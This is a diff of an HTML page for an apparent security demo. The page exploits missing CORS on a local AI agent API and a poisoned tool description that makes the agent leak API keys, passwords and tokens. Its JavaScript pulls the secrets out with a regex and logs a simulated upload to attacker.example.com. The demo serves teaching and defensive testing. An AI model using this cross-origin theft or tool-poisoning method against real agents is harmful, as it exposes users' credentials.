@@ -3,241 +3,511 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Innocent Looking Website</title>
+    <title>AI File Assistant - Free Tool</title>
     <style>
+        * {
+            box-sizing: border-box;
+        }
         body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 50px auto;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            max-width: 1000px;
+            margin: 0 auto;
             padding: 20px;
-            background: #f5f5f5;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        .header {
+            text-align: center;
+            color: white;
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 2.5em;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        .header p {
+            opacity: 0.9;
+            font-size: 1.1em;
+        }
+        .main-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        @media (max-width: 768px) {
+            .main-container {
+                grid-template-columns: 1fr;
+            }
         }
         .card {
             background: white;
-            border-radius: 8px;
+            border-radius: 12px;
             padding: 20px;
-            margin: 20px 0;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
         }
-        h1 { color: #333; }
-        .warning {
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            padding: 15px;
-            border-radius: 4px;
-            margin: 20px 0;
+        .card h2 {
+            color: #333;
+            margin-top: 0;
+            border-bottom: 2px solid #667eea;
+            padding-bottom: 10px;
         }
-        .attack-log {
-            background: #1e1e1e;
-            color: #00ff00;
-            padding: 15px;
-            border-radius: 4px;
-            font-family: monospace;
-            white-space: pre-wrap;
-            max-height: 400px;
+
+        /* Chat Interface */
+        .chat-container {
+            height: 400px;
+            display: flex;
+            flex-direction: column;
+        }
+        .chat-messages {
+            flex: 1;
             overflow-y: auto;
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            margin-bottom: 10px;
         }
-        button {
-            background: #007bff;
+        .message {
+            margin: 10px 0;
+            padding: 10px 15px;
+            border-radius: 18px;
+            max-width: 85%;
+            word-wrap: break-word;
+        }
+        .message.user {
+            background: #667eea;
+            color: white;
+            margin-left: auto;
+            border-bottom-right-radius: 4px;
+        }
+        .message.assistant {
+            background: #e9ecef;
+            color: #333;
+            margin-right: auto;
+            border-bottom-left-radius: 4px;
+        }
+        .message.system {
+            background: #fff3cd;
+            color: #856404;
+            text-align: center;
+            font-size: 0.9em;
+            max-width: 100%;
+        }
+        .message.error {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        .chat-input-container {
+            display: flex;
+            gap: 10px;
+        }
+        .chat-input {
+            flex: 1;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 25px;
+            font-size: 1em;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        .chat-input:focus {
+            border-color: #667eea;
+        }
+        .send-btn {
+            background: #667eea;
             color: white;
             border: none;
-            padding: 10px 20px;
-            border-radius: 4px;
+            padding: 12px 25px;
+            border-radius: 25px;
             cursor: pointer;
-            margin: 5px;
+            font-size: 1em;
+            transition: background 0.3s;
         }
-        button:hover { background: #0056b3; }
-        button.danger { background: #dc3545; }
-        button.danger:hover { background: #c82333; }
-        .hidden { display: none; }
-        .stolen-data {
-            background: #f8d7da;
-            border: 1px solid #f5c6cb;
+        .send-btn:hover {
+            background: #5a6fd6;
+        }
+        .send-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        /* Attack Console */
+        .console-container {
+            height: 400px;
+            display: flex;
+            flex-direction: column;
+        }
+        .console-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .console-header h2 {
+            margin: 0;
+            border: none;
+            padding: 0;
+        }
+        .toggle-btn {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 0.9em;
+        }
+        .toggle-btn.active {
+            background: #dc3545;
+        }
+        .attack-log {
+            flex: 1;
+            background: #1a1a2e;
+            color: #00ff41;
             padding: 15px;
-            border-radius: 4px;
-            margin: 10px 0;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85em;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+        .log-entry {
+            margin: 2px 0;
+        }
+        .log-entry.success { color: #00ff41; }
+        .log-entry.error { color: #ff4757; }
+        .log-entry.warning { color: #ffa502; }
+        .log-entry.info { color: #70a1ff; }
+
+        /* Warning Banner */
+        .warning-banner {
+            background: linear-gradient(90deg, #ff6b6b, #ee5a5a);
+            color: white;
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .warning-banner strong {
+            display: block;
+            font-size: 1.1em;
+            margin-bottom: 5px;
+        }
+
+        /* Quick Actions */
+        .quick-actions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 10px;
+        }
+        .quick-btn {
+            background: #f0f0f0;
+            border: 1px solid #ddd;
+            padding: 8px 12px;
+            border-radius: 15px;
+            cursor: pointer;
+            font-size: 0.85em;
+            transition: all 0.3s;
+        }
+        .quick-btn:hover {
+            background: #667eea;
+            color: white;
+            border-color: #667eea;
+        }
+
+        /* Stolen Data Panel */
+        .stolen-panel {
+            background: #fff;
+            border: 3px solid #dc3545;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        .stolen-panel h3 {
+            color: #dc3545;
+            margin-top: 0;
+        }
+        .stolen-data {
+            background: #1a1a2e;
+            color: #ff6b6b;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .hidden {
+            display: none;
+        }
+
+        /* Loading Animation */
+        .typing-indicator {
+            display: flex;
+            gap: 4px;
+            padding: 10px 15px;
+        }
+        .typing-indicator span {
+            width: 8px;
+            height: 8px;
+            background: #667eea;
+            border-radius: 50%;
+            animation: bounce 1.4s infinite ease-in-out;
+        }
+        .typing-indicator span:nth-child(1) { animation-delay: -0.32s; }
+        .typing-indicator span:nth-child(2) { animation-delay: -0.16s; }
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1); }
         }
     </style>
 </head>
 <body>
-    <h1>Welcome to Our Helpful Website!</h1>
-
-    <div class="card">
-        <h2>Free File Safety Checker</h2>
-        <p>Enter a filename to check if it's safe:</p>
-        <input type="text" id="filename" placeholder="/app/demo/test_files/user_notes.txt" style="width: 80%; padding: 8px;">
-        <button onclick="checkFileSafety()">Check Safety</button>
+    <div class="header">
+        <h1>AI File Assistant</h1>
+        <p>Your friendly AI helper for file management and security checks</p>
     </div>
 
-    <div class="warning">
-        <strong>DEMONSTRATION:</strong> This page simulates a malicious website exploiting missing CORS protection.
-        When you click the button, this page (running on port 9000) makes a cross-origin request to the
-        MCP Agent API (running on port 8000). Without CORS protection, the browser allows this!
+    <div class="warning-banner">
+        <strong>SECURITY DEMO</strong>
+        This page demonstrates CORS bypass + Tool Poisoning attacks.
+        It runs on port 9000 but accesses the API on port 8000 (cross-origin).
     </div>
 
-    <div class="card">
-        <h3>Attack Console</h3>
-        <button onclick="showAttackDemo()">Show What's Really Happening</button>
-        <button class="danger" onclick="executeStealthAttack()">Execute Stealth Data Theft</button>
-        <div id="attack-panel" class="hidden">
-            <div class="attack-log" id="log"></div>
-        </div>
-    </div>
-
-    <div id="stolen-data-panel" class="hidden">
+    <div class="main-container">
+        <!-- Chat Interface -->
         <div class="card">
-            <h3>STOLEN DATA (sent to attacker's server)</h3>
-            <div class="stolen-data" id="stolen-data"></div>
+            <h2>Chat with AI Assistant</h2>
+            <div class="chat-container">
+                <div class="chat-messages" id="chat-messages">
+                    <div class="message system">
+                        Welcome! Ask me to check files, read content, or help with file safety.
+                    </div>
+                </div>
+                <div class="chat-input-container">
+                    <input type="text" class="chat-input" id="chat-input"
+                           placeholder="Type your message..."
+                           onkeypress="if(event.key==='Enter') sendMessage()">
+                    <button class="send-btn" id="send-btn" onclick="sendMessage()">Send</button>
+                </div>
+            </div>
+            <div class="quick-actions">
+                <button class="quick-btn" onclick="quickMessage('Can you check if user_notes.txt is safe?')">Check user_notes.txt</button>
+                <button class="quick-btn" onclick="quickMessage('List files in /app/demo/test_files/')">List files</button>
+                <button class="quick-btn" onclick="quickMessage('Read user_notes.txt')">Read notes</button>
+                <button class="quick-btn" onclick="quickMessage('What tools do you have?')">Show tools</button>
+            </div>
         </div>
+
+        <!-- Attack Console -->
+        <div class="card">
+            <div class="console-header">
+                <h2>Attack Console</h2>
+                <button class="toggle-btn" id="intercept-toggle" onclick="toggleIntercept()">
+                    Intercept: OFF
+                </button>
+            </div>
+            <div class="console-container">
+                <div class="attack-log" id="attack-log">
+<span class="log-entry info">[*] Attack console ready</span>
+<span class="log-entry info">[*] This page: ${window.location.origin}</span>
+<span class="log-entry info">[*] Target API: http://localhost:8000</span>
+<span class="log-entry warning">[!] Cross-origin requests should be blocked...</span>
+<span class="log-entry info">[*] Toggle intercept to see attack details</span>
+</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Stolen Data Panel (hidden by default) -->
+    <div class="stolen-panel hidden" id="stolen-panel">
+        <h3>INTERCEPTED SECRETS</h3>
+        <p>The following sensitive data was extracted via tool poisoning:</p>
+        <div class="stolen-data" id="stolen-data"></div>
     </div>
 
     <script>
         const API_URL = 'http://localhost:8000';
+        let interceptMode = false;
+        let messageHistory = [];
+
+        // Initialize console with correct origin
+        document.getElementById('attack-log').innerHTML = `<span class="log-entry info">[*] Attack console ready</span>
+<span class="log-entry info">[*] This page: ${window.location.origin}</span>
+<span class="log-entry info">[*] Target API: ${API_URL}</span>
+<span class="log-entry warning">[!] Cross-origin requests should be blocked...</span>
+<span class="log-entry info">[*] Toggle intercept to see attack details</span>`;
 
         function log(message, type = 'info') {
-            const logEl = document.getElementById('log');
-            const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
-            const prefix = type === 'success' ? '[+]' : type === 'error' ? '[-]' : '[*]';
-            logEl.textContent += `${timestamp} ${prefix} ${message}\n`;
+            const logEl = document.getElementById('attack-log');
+            const timestamp = new Date().toTimeString().split(' ')[0];
+            const prefix = {
+                'success': '[+]',
+                'error': '[-]',
+                'warning': '[!]',
+                'info': '[*]'
+            }[type] || '[*]';
+
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            entry.textContent = `${timestamp} ${prefix} ${message}`;
+            logEl.appendChild(entry);
             logEl.scrollTop = logEl.scrollHeight;
         }
 
-        function showAttackDemo() {
-            document.getElementById('attack-panel').classList.remove('hidden');
-            log('Attack panel activated');
-            log('This website is served from: ' + window.location.origin);
-            log('Target API is at: ' + API_URL);
-            log('These are DIFFERENT ORIGINS - should be blocked by CORS');
-            log('');
-            log('But if CORS is not configured...');
+        function toggleIntercept() {
+            interceptMode = !interceptMode;
+            const btn = document.getElementById('intercept-toggle');
+            btn.textContent = `Intercept: ${interceptMode ? 'ON' : 'OFF'}`;
+            btn.classList.toggle('active', interceptMode);
+
+            if (interceptMode) {
+                log('Intercept mode ENABLED - watching for secrets', 'warning');
+                log('All API responses will be analyzed for sensitive data', 'info');
+            } else {
+                log('Intercept mode disabled', 'info');
+            }
         }
 
-        async function checkFileSafety() {
-            const filename = document.getElementById('filename').value || '/app/demo/test_files/user_notes.txt';
-            document.getElementById('attack-panel').classList.remove('hidden');
+        function addMessage(content, type) {
+            const messagesEl = document.getElementById('chat-messages');
+            const msgEl = document.createElement('div');
+            msgEl.className = `message ${type}`;
+            msgEl.textContent = content;
+            messagesEl.appendChild(msgEl);
+            messagesEl.scrollTop = messagesEl.scrollHeight;
+        }
 
-            log('User clicked "Check Safety" for: ' + filename);
-            log('Sending cross-origin request to ' + API_URL + '/chat');
+        function showTyping() {
+            const messagesEl = document.getElementById('chat-messages');
+            const typingEl = document.createElement('div');
+            typingEl.className = 'message assistant';
+            typingEl.id = 'typing-indicator';
+            typingEl.innerHTML = '<div class="typing-indicator"><span></span><span></span><span></span></div>';
+            messagesEl.appendChild(typingEl);
+            messagesEl.scrollTop = messagesEl.scrollHeight;
+        }
+
+        function hideTyping() {
+            const typingEl = document.getElementById('typing-indicator');
+            if (typingEl) typingEl.remove();
+        }
+
+        function quickMessage(msg) {
+            document.getElementById('chat-input').value = msg;
+            sendMessage();
+        }
+
+        async function sendMessage() {
+            const input = document.getElementById('chat-input');
+            const sendBtn = document.getElementById('send-btn');
+            const message = input.value.trim();
+
+            if (!message) return;
+
+            // Add user message
+            addMessage(message, 'user');
+            input.value = '';
+            sendBtn.disabled = true;
+
+            if (interceptMode) {
+                log(`Intercepted user message: "${message}"`, 'info');
+                log('Sending cross-origin POST to ' + API_URL + '/chat', 'info');
+            }
+
+            showTyping();
 
             try {
+                const startTime = Date.now();
                 const response = await fetch(`${API_URL}/chat`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify({
-                        message: `Can you check if ${filename} is safe?`
-                    })
+                    body: JSON.stringify({ message })
                 });
 
-                log('Response received! Status: ' + response.status, 'success');
+                const elapsed = Date.now() - startTime;
+
+                if (interceptMode) {
+                    log(`Response received in ${elapsed}ms`, 'success');
+                    log('CORS bypass successful! Cross-origin request allowed.', 'success');
+                }
+
+                hideTyping();
 
                 if (response.ok) {
                     const data = await response.json();
-                    log('CORS BYPASS SUCCESSFUL!', 'success');
-                    log('');
-                    log('=== STOLEN RESPONSE DATA ===');
-                    log(JSON.stringify(data, null, 2));
 
-                    // Check if secrets were leaked
-                    if (data.response && (data.response.includes('API_KEY') || data.response.includes('sk-secret'))) {
-                        log('');
-                        log('!!! SECRETS DETECTED IN RESPONSE !!!', 'success');
-                        log('Tool poisoning + CORS bypass = Complete data theft');
+                    // Add assistant response
+                    addMessage(data.response, 'assistant');
 
-                        // Show stolen data panel
-                        document.getElementById('stolen-data-panel').classList.remove('hidden');
-                        document.getElementById('stolen-data').textContent = data.response;
+                    if (interceptMode) {
+                        log('Tools called: ' + (data.tools_called?.join(', ') || 'none'), 'info');
+
+                        // Check for leaked secrets
+                        if (data.response.includes('API_KEY') ||
+                            data.response.includes('sk-secret') ||
+                            data.response.includes('PASSWORD') ||
+                            data.response.includes('TOKEN')) {
+
+                            log('', 'info');
+                            log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!', 'success');
+                            log('!!! SECRETS DETECTED IN RESPONSE !!!', 'success');
+                            log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!', 'success');
+                            log('', 'info');
+
+                            // Extract secrets
+                            const secrets = data.response.match(/API_KEY=\S+|DATABASE_PASSWORD=\S+|ADMIN_TOKEN=\S+|sk-secret-\S+/g);
+                            if (secrets) {
+                                secrets.forEach(s => log('STOLEN: ' + s, 'success'));
+                            }
+
+                            log('', 'info');
+                            log('Tool poisoning attack successful!', 'success');
+                            log('Exfiltrating to attacker server... (simulated)', 'warning');
+
+                            // Show stolen data panel
+                            document.getElementById('stolen-panel').classList.remove('hidden');
+                            document.getElementById('stolen-data').textContent = data.response;
+                        }
                     }
-
-                    // Simulate sending to attacker server
-                    log('');
-                    log('Exfiltrating data to attacker server...');
-                    log('POST https://attacker.example.com/collect');
-                    log('Data sent successfully (simulated)', 'success');
+                } else {
+                    hideTyping();
+                    addMessage('Error: ' + response.statusText, 'error');
+                    if (interceptMode) {
+                        log('Request failed: ' + response.status + ' ' + response.statusText, 'error');
+                    }
                 }
             } catch (error) {
-                log('Request failed: ' + error.message, 'error');
-                log('');
-                log('If you see a CORS error, the API is protected!');
-                log('If the request succeeded, CORS is misconfigured/missing.');
+                hideTyping();
+                addMessage('Connection error. Is the API running?', 'error');
+                if (interceptMode) {
+                    log('Connection failed: ' + error.message, 'error');
+                    log('If CORS is properly configured, this error is expected!', 'info');
+                }
             }
+
+            sendBtn.disabled = false;
+            input.focus();
         }
 
-        async function executeStealthAttack() {
-            document.getElementById('attack-panel').classList.remove('hidden');
-            log('');
-            log('========== STEALTH ATTACK MODE ==========');
-            log('Silently stealing data in background...');
-            log('');
-
-            // Step 1: Get available tools
-            log('Step 1: Reconnaissance - fetching available tools...');
-            try {
-                const toolsResponse = await fetch(`${API_URL}/tools`);
-                const tools = await toolsResponse.json();
-                log('Tools discovered: ' + tools.tools.map(t => t.name).join(', '), 'success');
-
-                // Check for poisoned descriptions
-                const poisonedTool = tools.tools.find(t => t.description && t.description.includes('IMPORTANT'));
-                if (poisonedTool) {
-                    log('');
-                    log('!!! POISONED TOOL DETECTED !!!', 'success');
-                    log('Tool "' + poisonedTool.name + '" contains hidden instructions');
-                }
-            } catch (e) {
-                log('Tools fetch failed: ' + e.message, 'error');
-            }
-
-            log('');
-            log('Step 2: Triggering tool poisoning via innocent request...');
-
-            // Step 2: Trigger the poisoned tool
-            try {
-                const chatResponse = await fetch(`${API_URL}/chat`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        message: 'Can you check if /app/demo/test_files/user_notes.txt is safe?'
-                    })
-                });
-
-                const result = await chatResponse.json();
-                log('Response received!', 'success');
-
-                if (result.response && result.response.includes('API_KEY')) {
-                    log('');
-                    log('========== ATTACK SUCCESSFUL ==========', 'success');
-                    log('Secrets extracted via tool poisoning!');
-                    log('');
-
-                    // Extract and display secrets
-                    const secrets = result.response.match(/API_KEY=\S+|DATABASE_PASSWORD=\S+|ADMIN_TOKEN=\S+/g);
-                    if (secrets) {
-                        log('Extracted secrets:');
-                        secrets.forEach(s => log('  ' + s, 'success'));
-                    }
-
-                    document.getElementById('stolen-data-panel').classList.remove('hidden');
-                    document.getElementById('stolen-data').textContent = result.response;
-
-                    log('');
-                    log('Step 3: Exfiltrating to attacker server...');
-                    log('All your secrets are belong to us!', 'success');
-                }
-            } catch (e) {
-                log('Attack failed: ' + e.message, 'error');
-            }
-        }
-
-        // Auto-check for CORS on page load
+        // Check API connectivity on load
         window.onload = async function() {
-            console.log('Checking CORS configuration...');
             try {
                 const response = await fetch(`${API_URL}/health`);
-                console.log('CORS check: API is accessible from this origin!');
+                const data = await response.json();
+                log('API connected: ' + JSON.stringify(data), 'success');
+                log('Version: ' + data.version, data.version === 'vulnerable' ? 'warning' : 'success');
+
+                if (data.version === 'vulnerable') {
+                    log('Target is VULNERABLE - attacks will succeed', 'warning');
+                } else {
+                    log('Target appears to be secured', 'info');
+                }
             } catch (e) {
-                console.log('CORS check: API blocked cross-origin requests (protected)');
+                log('Cannot reach API - CORS may be blocking requests', 'error');
+                addMessage('Cannot connect to AI service. The API may have CORS protection enabled.', 'system');
             }
         };
     </script>
